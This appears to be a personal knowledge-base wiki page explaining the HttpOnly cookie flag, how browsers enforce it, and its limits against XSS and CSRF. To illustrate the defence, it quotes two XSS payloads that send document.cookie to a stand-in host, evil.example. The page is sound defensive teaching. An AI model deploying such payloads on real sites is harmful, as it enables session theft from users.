---
type: "concept"
title: "HttpOnly Cookie Flag"
description: "Cookie attribute that hides the value from JavaScript document.cookie"
tags: ["http", "cookies", "security", "web"]
timestamp: "2026-08-02T00:00:00Z"
status: "growing"
---
# HttpOnly Cookie Flag

## Summary
The HttpOnly flag on a cookie tells the browser to keep it invisible to JavaScript: document.cookie never shows it. It is the primary defense that turns session cookies into moving targets for XSS exfiltration.

## Details
A cookie set with the HttpOnly attribute cannot be read or modified by JavaScript running on the page; it is only attached to HTTP requests by the browser. An XSS payload that runs document.cookie sees everything except HttpOnly cookies, so a session cookie protected this way cannot be lifted by the standard exfiltration pattern (fetch('https://evil.example/' + document.cookie)).

The mechanism: the attribute is part of Set-Cookie (Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax). The browser enforces it at the cookie store level: the cookie is present for request headers but absent from the DOM API. It does not prevent the cookie from being sent on cross-site requests (that is SameSite's job) and does not stop an XSS from performing actions as the user (the request will still carry the cookie); it only stops the token value from being read.

Concrete example: a wiki's session cookie is HttpOnly. A stored XSS injects <script>new Image().src='https://evil.example/?c='+document.cookie</script>; the attacker receives everything except the session token, so session hijacking via XSS fails — although the attacker can still POST as the user while the XSS runs (CSRF-style abuse). The practical pairing is HttpOnly for session cookies plus CSRF protection for state changes.

Failure modes: forgetting HttpOnly on auth cookies is the single most common session-theft enabler; setting HttpOnly but serving over HTTP without Secure leaves the cookie stealable in transit; and HttpOnly does nothing against exfiltration of tokens stored outside cookies (localStorage), so auth tokens should live in HttpOnly cookies, not script-accessible storage.

Operational tradeoffs: HttpOnly costs nothing and breaks almost nothing — the only JavaScript that legitimately needs the cookie's value (rare; usually auth SDKs) must be redesigned. The baseline for every session and auth cookie: HttpOnly plus Secure plus SameSite=Lax, set centrally. XSS defense then reduces the remaining risk to action-forgery rather than full session theft.

RSIS3/mykb relevance: the dashboard's session cookie must be HttpOnly; documenting the flag set lets RSIS3's security checks assert it on every auth response rather than relying on memory.

## Related
- [[wiki/api-protocols/secure-cookies|Secure Cookies]]
- [[wiki/api-protocols/samesite-lax-strict|SameSite Lax vs Strict]]
- [[wiki/api-protocols/cookie-prefixes|Cookie Prefixes]]
- [[wiki/api-protocols/cookie-scoping|Cookie Scoping]]
- [[wiki/api-protocols/http-cookies|HTTP Cookies]]
- [[wiki/api-protocols/csrf|CSRF]]
- [[wiki/security-auth/same-origin-policy|Same-Origin Policy]]
